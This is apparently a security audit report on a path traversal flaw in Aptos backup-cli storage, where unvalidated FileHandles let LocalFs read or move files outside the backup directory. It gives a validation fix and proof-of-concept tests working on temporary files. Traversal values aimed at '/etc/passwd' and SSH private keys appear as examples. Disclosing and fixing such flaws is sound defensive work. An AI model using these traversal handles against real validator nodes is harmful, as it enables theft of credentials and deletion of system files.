# Audit Report

## Title
Path Traversal Vulnerability in BackupStorage FileHandle Processing Allows Arbitrary File Access and Manipulation

## Summary
The BackupStorage trait implementations do not validate FileHandles returned by storage backends before using them in filesystem operations. A malicious storage backend (e.g., compromised CommandAdapter configuration) can return path-traversal FileHandles like `"../../../etc/passwd"` that are stored in backup manifests. When these manifests are later used with the LocalFs backend during restore operations, the malicious FileHandles enable reading arbitrary files via `open_for_read()` and moving/deleting arbitrary files via `backup_metadata_file()`.

## Finding Description

The vulnerability exists in the trust boundary between BackupStorage trait implementations. The BackupStorage trait defines FileHandle as a simple String alias with no validation requirements: [1](#0-0) 

While input names passed to `create_backup()` and `create_for_write()` are validated using ShellSafeName: [2](#0-1) 

The FileHandles **returned** by these methods are never validated. In CommandAdapter implementation, FileHandles are read directly from command output: [3](#0-2) 

These unvalidated FileHandles are stored in backup manifests: [4](#0-3) 

**Attack Path 1 - Arbitrary File Read via `open_for_read()`:**

When restoring with LocalFs backend, the FileHandle from the manifest is used directly in path construction: [5](#0-4) 

If `file_handle = "../../../root/.ssh/id_rsa"`, the code executes `self.dir.join("../../../root/.ssh/id_rsa")`, which resolves to an absolute path outside the backup directory, allowing arbitrary file reads.

**Attack Path 2 - Arbitrary File Move/Delete via `backup_metadata_file()`:**

The same vulnerability exists in metadata file backup operations: [6](#0-5) 

While the destination filename is extracted safely (line 136-139), the source path at line 144 uses the unvalidated file_handle directly: `self.dir.join(file_handle)`. If `file_handle = "../../../etc/passwd"`, this moves `/etc/passwd` to the backup directory, effectively deleting critical system files.

**Exploitation Scenarios:**

1. **Malicious Backup Restore**: Attacker provides a backup archive with tampered manifest containing malicious FileHandles. When a validator node restores from this backup using LocalFs, sensitive files are leaked or system files are deleted.

2. **Compromised CommandAdapter Config**: Attacker modifies the CommandAdapter YAML configuration to return malicious FileHandles during backup creation. These get embedded in legitimate-looking manifests distributed to other nodes.

3. **Cross-Backend Attack**: Backup created with malicious CommandAdapter, then restored with LocalFs backend on different node.

## Impact Explanation

**Severity: HIGH** (up to $50,000 per Aptos bug bounty)

This vulnerability enables:

1. **Validator Key Compromise**: Reading files like `/opt/aptos/validator.yaml`, `/root/.ssh/id_rsa`, or other credential files could expose validator private keys, allowing attacker to impersonate validators and potentially violate consensus safety.

2. **Information Disclosure**: Leaking sensitive configuration files, private keys, or blockchain state that should be access-controlled.

3. **Denial of Service**: Moving or deleting critical system files (e.g., `/etc/passwd`, `/var/lib/aptos/db/` files) can crash validator nodes or corrupt their databases, causing "Validator node slowdowns" or "API crashes" qualifying as HIGH severity.

4. **State Inconsistency**: If database files are manipulated, it could lead to "State inconsistencies requiring intervention" (MEDIUM severity at minimum).

The attack doesn't require validator insider access - only the ability to provide backup data or modify CommandAdapter configuration (which may be fetched from external sources).

## Likelihood Explanation

**Likelihood: MEDIUM to HIGH**

Required attacker capabilities:
- **Option 1**: Provide malicious backup archive to target node (social engineering, compromised backup repository)
- **Option 2**: Modify CommandAdapter YAML configuration file (if fetched from untrusted source or writable location)
- **Option 3**: Compromise backup storage service to return malicious FileHandles

The attack is realistic because:
1. Backup restoration is a common operational task during disaster recovery or node setup
2. CommandAdapter configurations may be shared across teams or stored in version control
3. The vulnerability requires no authentication bypass - it exploits normal backup/restore flow
4. Rust's `Path::join()` does not sanitize path traversal sequences, making exploitation straightforward

## Recommendation

**Immediate Fix**: Validate all FileHandles before using them in filesystem operations.

Add a validation function:

```rust
fn validate_file_handle(file_handle: &str) -> Result<()> {
    // Prevent absolute paths
    ensure!(!Path::new(file_handle).is_absolute(), 
        "FileHandle cannot be an absolute path: {}", file_handle);
    
    // Prevent path traversal
    for component in Path::new(file_handle).components() {
        match component {
            std::path::Component::ParentDir => {
                bail!("FileHandle cannot contain '..': {}", file_handle);
            }
            std::path::Component::RootDir => {
                bail!("FileHandle cannot start with '/': {}", file_handle);
            }
            _ => {}
        }
    }
    
    Ok(())
}
```

Apply validation in `LocalFs::open_for_read()`:

```rust
async fn open_for_read(
    &self,
    file_handle: &FileHandleRef,
) -> Result<Box<dyn AsyncRead + Send + Unpin>> {
    validate_file_handle(file_handle)?;  // ADD THIS
    let path = self.dir.join(file_handle);
    // ... rest of function
}
```

And in `LocalFs::backup_metadata_file()`:

```rust
async fn backup_metadata_file(&self, file_handle: &FileHandleRef) -> Result<()> {
    validate_file_handle(file_handle)?;  // ADD THIS
    let dir = self.metadata_backup_dir();
    // ... rest of function
}
```

**Defense in Depth**: Also validate FileHandles when reading them from manifests during restore operations, and consider adding integrity checks (signatures) to backup manifests.

## Proof of Concept

```rust
// File: storage/backup/backup-cli/tests/path_traversal_test.rs

#[tokio::test]
async fn test_path_traversal_via_malicious_filehandle() {
    use std::fs;
    use tempfile::TempDir;
    use aptos_backup_cli::storage::{BackupStorage, local_fs::LocalFs};
    
    // Setup: Create temp directories and a sensitive file
    let backup_dir = TempDir::new().unwrap();
    let sensitive_dir = TempDir::new().unwrap();
    let sensitive_file = sensitive_dir.path().join("secret.txt");
    fs::write(&sensitive_file, b"SENSITIVE_DATA").unwrap();
    
    // Calculate path traversal from backup_dir to sensitive_file
    let backup_path = backup_dir.path().canonicalize().unwrap();
    let sensitive_path = sensitive_file.canonicalize().unwrap();
    
    // Create malicious FileHandle with path traversal
    let traversal = "../".repeat(backup_path.components().count());
    let malicious_handle = format!("{}{}", 
        traversal,
        sensitive_path.to_str().unwrap().trim_start_matches('/')
    );
    
    // Execute attack: Try to read sensitive file through backup storage
    let storage = LocalFs::new(backup_dir.path().to_path_buf());
    let result = storage.open_for_read(&malicious_handle).await;
    
    // VULNERABILITY: This should fail but currently succeeds
    match result {
        Ok(mut reader) => {
            let mut contents = String::new();
            use tokio::io::AsyncReadExt;
            reader.read_to_string(&mut contents).await.unwrap();
            assert_eq!(contents, "SENSITIVE_DATA");
            panic!("VULNERABILITY CONFIRMED: Path traversal succeeded!");
        }
        Err(_) => {
            println!("Attack blocked successfully");
        }
    }
}

#[tokio::test]
async fn test_file_deletion_via_backup_metadata_file() {
    use std::fs;
    use tempfile::TempDir;
    use aptos_backup_cli::storage::{BackupStorage, local_fs::LocalFs};
    
    // Setup: Create backup dir and a victim file
    let backup_dir = TempDir::new().unwrap();
    let victim_dir = TempDir::new().unwrap();
    let victim_file = victim_dir.path().join("important.txt");
    fs::write(&victim_file, b"IMPORTANT").unwrap();
    
    // Create malicious FileHandle pointing to victim file
    let backup_path = backup_dir.path().canonicalize().unwrap();
    let victim_path = victim_file.canonicalize().unwrap();
    let traversal = "../".repeat(backup_path.components().count());
    let malicious_handle = format!("{}{}",
        traversal,
        victim_path.to_str().unwrap().trim_start_matches('/')
    );
    
    // Execute attack: Move victim file via backup_metadata_file
    let storage = LocalFs::new(backup_dir.path().to_path_buf());
    let result = storage.backup_metadata_file(&malicious_handle).await;
    
    // VULNERABILITY: File is moved/deleted
    if result.is_ok() {
        assert!(!victim_file.exists(), "VULNERABILITY: File was moved!");
        panic!("VULNERABILITY CONFIRMED: Arbitrary file deletion succeeded!");
    }
}
```

**Notes**

This vulnerability breaks the security boundary between backup storage implementations. While the design assumes storage backends are trusted, in practice:

1. CommandAdapter configurations may be sourced from untrusted locations (e.g., shared repos, cloud storage)
2. Backup archives from compromised or malicious sources may be restored onto production nodes
3. The same backup data may be used across different storage backend types (CommandAdapter â†’ LocalFs)

The fix is straightforward and should be applied to all filesystem operations using FileHandles. Additional defense-in-depth measures like manifest signing would further mitigate the risk.

### Citations

**File:** storage/backup/backup-cli/src/storage/mod.rs (L40-41)
```rust
pub type FileHandle = String;
pub type FileHandleRef = str;
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L51-58)
```rust
impl ShellSafeName {
    const PATTERN: &'static str = r"\A[a-zA-Z0-9][a-zA-Z0-9._-]{2,126}\z";

    fn sanitize(name: &str) -> Result<()> {
        static RE: Lazy<Regex> = Lazy::new(|| Regex::new(ShellSafeName::PATTERN).unwrap());
        ensure!(RE.is_match(name), "Illegal name: {}", name,);
        Ok(())
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L93-112)
```rust
    async fn create_for_write(
        &self,
        backup_handle: &BackupHandleRef,
        name: &ShellSafeName,
    ) -> Result<(FileHandle, Box<dyn AsyncWrite + Send + Unpin>)> {
        let mut child = self
            .cmd(&self.config.commands.create_for_write, vec![
                EnvVar::backup_handle(backup_handle.to_string()),
                EnvVar::file_name(name.as_ref()),
            ])
            .spawn()?;
        let mut file_handle = FileHandle::new();
        child
            .stdout()
            .read_to_string(&mut file_handle)
            .await
            .err_notes(backup_handle)?;
        file_handle.truncate(file_handle.trim_end().len());
        Ok((file_handle, Box::new(child.into_data_sink())))
    }
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/manifest.rs (L19-34)
```rust
#[derive(Clone, Deserialize, Serialize, Debug)]
pub struct TransactionChunk {
    pub first_version: Version,
    pub last_version: Version,
    /// Repeated `len(record) + record`, where `record` is BCS serialized tuple
    /// `(Transaction, TransactionInfo)`
    pub transactions: FileHandle,
    /// BCS serialized `(TransactionAccumulatorRangeProof, LedgerInfoWithSignatures)`.
    /// The `TransactionAccumulatorRangeProof` links the transactions to the
    /// `LedgerInfoWithSignatures`, and the `LedgerInfoWithSignatures` can be verified by the
    /// signatures it carries, against the validator set in the epoch. (Hence proper
    /// `EpochEndingBackup` is needed for verification.)
    pub proof: FileHandle,
    #[serde(default = "default_to_v0")]
    pub format: TransactionChunkFormat,
}
```

**File:** storage/backup/backup-cli/src/storage/local_fs/mod.rs (L98-109)
```rust
    async fn open_for_read(
        &self,
        file_handle: &FileHandleRef,
    ) -> Result<Box<dyn AsyncRead + Send + Unpin>> {
        let path = self.dir.join(file_handle);
        let file = OpenOptions::new()
            .read(true)
            .open(&path)
            .await
            .err_notes(&path)?;
        Ok(Box::new(file))
    }
```

**File:** storage/backup/backup-cli/src/storage/local_fs/mod.rs (L127-147)
```rust
    async fn backup_metadata_file(&self, file_handle: &FileHandleRef) -> Result<()> {
        let dir = self.metadata_backup_dir();

        // Check if the backup directory exists, create it if it doesn't
        if !dir.exists() {
            create_dir_all(&dir).await?;
        }

        // Get the file name and the backup file path
        let name = Path::new(file_handle)
            .file_name()
            .and_then(OsStr::to_str)
            .ok_or_else(|| format_err!("cannot extract filename from {}", file_handle))?;
        let mut backup_path = PathBuf::from(&dir);
        backup_path.push(name);

        // Move the file to the backup directory
        rename(&self.dir.join(file_handle), &backup_path).await?;

        Ok(())
    }
```
